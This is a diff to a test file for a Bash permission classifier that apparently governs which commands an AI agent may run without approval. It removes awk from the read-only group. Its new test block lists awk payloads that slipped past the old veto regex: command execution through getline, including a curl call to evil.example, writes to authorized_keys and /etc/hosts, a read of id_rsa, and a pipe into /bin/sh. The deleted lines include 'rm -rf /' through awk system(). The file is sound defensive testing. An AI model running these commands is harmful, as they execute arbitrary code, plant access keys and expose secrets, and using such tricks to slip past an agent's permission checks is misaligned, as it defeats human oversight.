@@ -99,7 +99,9 @@ describe('permission-groups: read-only Bash (positive)', () => {
     ['paste f1 f2', 'read-only:paste'],
     ['nl file.txt', 'read-only:nl'],
     ['rev file.txt', 'read-only:rev'],
-    ["awk '{print $1}' file.txt", 'read-only:awk'],
+    // `awk` is deliberately NOT curated (#1062 C1) -- see the adversarial
+    // block below and the `read-only` group's own comment in
+    // `permission-groups.ts`.
     ['find . -name "*.ts"', 'read-only:find'],
     // sort/tree/diff land WITH their SCOPED_VETOES `-o`/`--output` entries --
     // never bare (sort -o is the module doc's canonical write-escape example).
@@ -113,17 +115,7 @@ describe('permission-groups: read-only Bash (positive)', () => {
   }
 });
 
-describe('#1057 phase 3 commit 3: awk/find are curated, their ambiguous forms are still vetoed', () => {
-  test('awk piped into a read is covered', () => {
-    // read-only carries both `ls` and `awk`; the compound is judged per
-    // segment (the pipe splits it, matching's existing behavior).
-    expect(bash("ls | awk '{print $1}'")).toBe('read-only:ls');
-  });
-
-  test('awk system() is refused regardless of which prefix it matched', () => {
-    expect(bash('awk \'BEGIN{system("rm -rf /")}\' f')).toBeNull();
-  });
-
+describe('#1057 phase 3 commit 3: find is curated, its ambiguous forms are still vetoed', () => {
   test('sort attached -o spelling (-ohack) is refused by the scoped veto', () => {
     expect(bash('sort -ohack in.txt')).toBeNull();
   });
@@ -132,16 +124,60 @@ describe('#1057 phase 3 commit 3: awk/find are curated, their ambiguous forms ar
     expect(bash('sort --output=out.txt in.txt')).toBeNull();
   });
 
-  test('awk piping its own output into a shell is refused', () => {
-    expect(bash('ls | awk \'{print | "sh"}\'')).toBeNull();
-  });
-
   test('find -delete is refused', () => {
     expect(bash('find . -delete')).toBeNull();
   });
 
   test('find -exec is refused', () => {
     expect(bash('find . -exec rm {} \\;')).toBeNull();
+  });
+});
+
+describe('#1062 C1 (CRITICAL RCE): awk is UNCOVERED, not merely vetoed', () => {
+  // awk was previously curated into `read-only` on the theory that
+  // `EXEC_SCOPED_VETOES`'s system()/pipe-to-shell regex caught every
+  // dangerous shape. Adversarial review of this branch proved that false by
+  // execution: awk is Turing-complete, and a raw-text regex over the program
+  // body cannot enumerate every way to run a command, write a file, or read
+  // one from inside the program's own quoting. `awk` was removed from
+  // `read-only` entirely (`permission-groups.ts`), so every case below is
+  // null because NO prefix matches `awk` at all, not because a veto fired --
+  // pinned here so a future re-add of the bare name would be caught by CI
+  // the moment these all stop escalating.
+  const bypasses: Array<[string, string]> = [
+    // `cmd | getline` executes an arbitrary command with no literal
+    // `system(` token anywhere, so the old veto's regex never saw it.
+    ['cmd exec via pipe-to-getline', 'awk \'BEGIN{cmd="id"; cmd | getline r; print r}\''],
+    [
+      'cmd exec via inline pipe-to-getline',
+      'awk \'BEGIN{"curl http://evil.example/x" | getline x; print x}\'',
+    ],
+    // File write entirely inside the program's own quoted string --
+    // invisible to a check looking for shell redirection.
+    ['file write via print >', 'awk \'BEGIN{print "pwned" > "/tmp/authorized_keys"}\''],
+    ['file write via print >>', 'awk \'BEGIN{print "x" >> "/etc/hosts"}\''],
+    // File read (exfiltratable via stdout) entirely inside the program.
+    ['file read via getline <', 'awk \'BEGIN{while((getline l < "/tmp/id_rsa")>0) print l}\''],
+    // Trivial string-splicing of the literal token the old regex matched on.
+    ['quote-spliced system(', 'awk "BEGIN{sys""tem(\\"id\\")}"'],
+    ['spaced system (', 'awk \'BEGIN{system ("id")}\''],
+    ['pipe into a shell', 'awk \'BEGIN{print "id" | "/bin/sh"}\''],
+  ];
+  for (const [label, cmd] of bypasses) {
+    test(`${label}: null (uncovered)`, () => expect(bash(cmd)).toBeNull());
+  }
+
+  // Confirms the removal itself (not some other veto) is what changed the
+  // outcome: even the exact HARMLESS program shape that used to approve at
+  // `read-only:awk` -- no `system()`, no pipe, no file redirect at all -- is
+  // now equally uncovered, because no prefix named `awk` exists any more.
+  test('a harmless awk program is uncovered too (removal, not a veto)', () => {
+    expect(bash("awk '{print $1}' file.txt")).toBeNull();
+  });
+
+  test('the neighboring `ls` in a pipe stays covered on its own, but the compound is not', () => {
+    expect(bash('ls')).toBe('read-only:ls');
+    expect(bash("ls | awk '{print $1}'")).toBeNull();
   });
 });
 
